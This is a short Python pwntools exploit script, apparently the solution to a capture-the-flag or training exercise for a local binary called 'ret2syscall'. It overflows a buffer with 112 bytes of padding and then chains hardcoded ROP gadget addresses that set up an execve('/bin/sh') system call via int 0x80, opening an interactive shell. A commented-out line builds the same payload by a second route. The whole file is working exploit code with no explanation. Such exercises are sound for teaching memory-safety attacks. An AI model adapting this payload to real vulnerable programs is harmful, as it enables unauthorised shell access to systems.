#!/usr/bin/env python
from pwn import *

sh = process('./ret2syscall')

pop_eax_ret = 0x080bb196
pop_edx_ecx_ebx_ret = 0x0806eb90
int_0x80 = 0x08049421
binsh = 0x80be408
payload = flat(['A' * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])
# payload2 = 'A' * 112+p32(pop_eax_ret).decode("iso-8859-1")+p32(0xb).decode("iso-8859-1")+p32(pop_edx_ecx_ebx_ret).decode("iso-8859-1")+p32(0x0).decode("iso-8859-1")+p32(0x0).decode("iso-8859-1")+p32(binsh).decode("iso-8859-1")+p32(int_0x80).decode("iso-8859-1")
sh.sendline(payload)
sh.interactive()